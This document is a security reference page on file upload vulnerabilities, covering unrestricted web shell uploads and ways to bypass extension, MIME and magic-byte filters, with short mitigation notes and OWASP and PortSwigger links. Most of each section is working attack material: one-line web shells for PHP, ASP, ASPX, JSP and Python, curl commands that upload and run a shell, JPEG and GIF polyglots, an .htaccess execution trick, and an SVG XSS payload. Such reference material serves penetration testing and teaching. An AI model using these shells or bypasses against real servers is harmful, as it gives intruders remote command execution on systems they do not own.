# File Upload Vulnerabilities

Unrestricted file upload allows an attacker to upload arbitrary files to the server —
most critically, web shells that give direct code execution.

---

## Unrestricted File Upload (Webshell)

**Category:** RCE via File Upload
**Severity context:** Critical — upload a web shell and execute commands on the server.

### How to identify it
Find any file upload endpoint: profile pictures, document uploads, CSV import, attachment
features. Attempt to upload a simple text file first. If it succeeds, escalate to
executable extensions (.php, .asp, .jsp). Check whether the uploaded file is directly
accessible via a URL.

### How it works
The application accepts a file and stores it on disk (or in cloud storage) without
validating the file type, extension, or content. If the file is stored in a web-accessible
directory and the server executes scripts (e.g. Apache mod_php, Tomcat JSP), the attacker
can access the uploaded file via HTTP and the server runs its code.

### Exploitation
```bash
# Simple PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -F "file=@shell.php" http://target.com/upload
curl http://target.com/uploads/shell.php?cmd=id

# More stealthy shell — image polyglot
# Embed PHP in JPEG comment section
exiftool -comment='<?php system($_GET["cmd"]); ?>' image.jpg shell.jpg.php
# Or append PHP bytes to a valid image
echo '<?php system($_GET["cmd"]); ?>' >> image.jpg
# Upload as image.jpg.php or image.jpg (if server ignores extension)

# One-liner shells for various languages
# PHP
<?php system($_GET['cmd']); ?>
# ASP
<% eval request("cmd") %>
# ASPX
<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start(Request["cmd"]).StandardOutput.ReadToEnd()); %>
# JSP
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
# Python (Django/Flask)
import os; os.system(request.GET['cmd'])
```

### Example
```
Upload request:
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="file"; filename="cmd.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------BOUNDARY--

Access:  GET /uploads/cmd.php?cmd=id
Result:  uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Mitigation
Validate file extension against an allow-list (never a deny-list). Validate MIME type
server-side (not from the Content-Type header). Store uploads outside the web root and
serve them via a script that sets `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.
Disable script execution in upload directories via `.htaccess` or nginx config.

### References
- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PortSwigger: File upload vulnerabilities](https://portswigger.net/web-security/file-upload)

---

## Extension Bypass Techniques

**Category:** RCE via File Upload
**Severity context:** Critical — bypass flawed filters to achieve the same outcome.

### How to identify it
If a basic `.php` upload is blocked, determine the filter type: extension blacklist,
content-type check, magic byte check, or double extension detection. Test systematically
to map the filter's exact behavior.

### How it works
Developers often implement file upload validation as an extension blacklist, MIME-type
check, or magic-byte check — all of which have well-known bypasses.

### Exploitation
```bash
# Case manipulation (if server is case-insensitive)
shell.PhP   shell.pHp   shell.phtml   shell.pht

# Double extension (Apache handles last extension, some filters check first)
shell.php.jpg   shell.php.txt

# Trailing dots / spaces (Windows strips them)
shell.php.   shell.php. .   shell.php._

# Null byte (older PHP/Apache)
shell.php%00.jpg

# Alternate extensions that PHP may execute
shell.pht   shell.phtml   shell.php5   shell.php7   shell.shtml   shell.inc

# .htaccess upload — enable arbitrary extension execution
# Upload an .htaccess file first:
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .txt
EOF
# Then upload shell.txt with PHP code

# Content-Type manipulation
# Change Content-Type from application/x-php to image/jpeg

# Magic byte injection — add image header bytes before PHP code
shell.php content:
GIF89a<?php system($_GET['cmd']); ?>
# GIF89a tricks some magic-byte checks

# SVG upload — XSS via SVG
cat > shell.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
EOF
```

### Mitigation
Use extension allow-lists only (e.g. `jpg`, `png`, `gif`, `pdf`). Validate file content
magic bytes AND extension. Store files with a server-generated filename (never use the
user-supplied name). Disable `.htaccess` overrides in upload directories.

### References
- [PortSwigger: File upload bypass techniques](https://portswigger.net/web-security/file-upload#bypassing-file-upload-filters)
- [PayloadsAllTheThings: File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
